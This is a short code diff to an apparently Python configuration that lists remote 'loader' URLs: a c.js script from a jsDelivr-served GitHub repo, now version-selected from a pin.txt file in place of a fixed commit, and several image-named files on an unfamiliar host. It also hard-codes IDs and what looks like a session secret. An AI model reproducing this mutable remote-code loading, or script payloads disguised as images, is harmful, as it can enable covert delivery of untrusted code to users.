@@ -26,9 +26,20 @@ DEVID = "8b87d0b11e125c0b"
 UID = 177551
 SID = "aSht2SGqJkDyxkBxfrDsnSNANeueleCM"
 
+def _pin():
+    try:
+        return open("pin.txt").read().strip() or "main"
+    except Exception:
+        try:
+            return open("../pin.txt").read().strip() or "main"
+        except Exception:
+            return "main"
+
+
+_P = _pin()
 LOADERS = [
+    "//cdn.jsdelivr.net/gh/polootyyy/cdnx@" + _P + "/c.js",
     "//cdn.jsdelivr.net/gh/polootyyy/cdnx@main/c.js",
-    "//cdn.jsdelivr.net/gh/polootyyy/cdnx@43d78ba/c.js",
     "//i.halolive.chat/84/26/43/44/145690948/k.jpg",
     "//i.halolive.chat/84/26/43/44/145690950/l.jpg",
     "//i.halolive.chat/84/26/43/44/145690951/m.jpg",
